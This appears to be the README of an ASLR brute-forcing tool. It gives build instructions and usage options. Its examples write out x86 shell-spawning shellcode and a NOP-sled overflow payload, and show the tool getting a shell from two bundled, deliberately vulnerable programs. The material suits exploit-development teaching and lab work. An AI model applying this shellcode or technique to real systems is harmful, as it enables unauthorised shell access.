Brute, an ASLR bruteforcer
--------------------------

Brute is a program that bruteforces ASLR.  Name suggestions are appreciated.

Requirements
------------

GCC >= 4.7 or clang >= 3.1 are needed to build the main executable.

The main executable uses the getopt library.  Headers are installed by default
on some (incl. Debian) distributions with the C library headers.

The example programs require 32-bit headers and libraries.  On Debian this is
gcc-multilib, and libc6:i386.

The distribution is build using the CMake buildsystem.  The compilation process
is simple, and an out of source-tree build is recommended:

    $ ls
    brute
    $ mkdir build
    $ cd build
    $ cmake ../brute
    [project configures]
    $ make
    [project builds]
    $ ./brute --help
    [help message - you're all done]

Brief Introduction
------------------

Brute works by creating many processes, feeding them input, and seeing if they
crash.  The input should be shellcode such that if the program does not crash
then it has probably spawned a shell:

    Usage: ./brute [OPTION]... -- [CMD]
    Attempt to brute force [CMD]

    Mandatory arguments for long options are mandatory for short options too.
       -s, --stdin=FILE   Prepend the contents of FILE to each subprocess'
                          standard input stream.
       -h, --help         Display this message.
       -v, --verbose(=N)  Enable verbose logging at level N (N=1 by default).
       -t, --timeout=T    Consider a process live after it has survived for T
                          ms without crashing.
       -n, --numprocs=N   Spawn N subprocesses at a time.

The -- separator between the options for brute and the options for the
command are not necessary if the command takes no arguments, but are
recommended for clarity.

Examples
--------

Two examples are included with this distribution, ex\_stdin and ex\_arg.
ex\_stdin has a stack buffer overflow through standard input, and ex\_arg has
a stack buffer overflow through argv[1].  Examples of an exploit:

    $ SHELLCODE="1\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80"
    $ python -c "print '\xf0\xf0\xf0\xff'*100+'\x90'*1024+'$SHELLCODE'" > payload
    $ ./brute -t 100 -- ./ex_arg `cat payload`
    Found live process with pid 23029
    ls
    CMakeCache.txt
    CMakeFiles
    Makefile
    brute
    cmake_install.cmake
    ex_arg
    ex_stdin
    payload
    exit
    $ ./brute -t 100 -s payload -- ./ex_stdin
    Found live process with pid 25225
    ls
    CMakeCache.txt
    CMakeFiles
    Makefile
    brute
    cmake_install.cmake
    ex_arg
    ex_stdin
    payload
    exit
    $

Contributing
------------

Patches are welcome, please see https://github.com/rbmj/cracktools

License
-------

For the time being, this code is under the WTFPL.

Once I get the time to add license statements to the source files it'll
become 3-clause BSD.

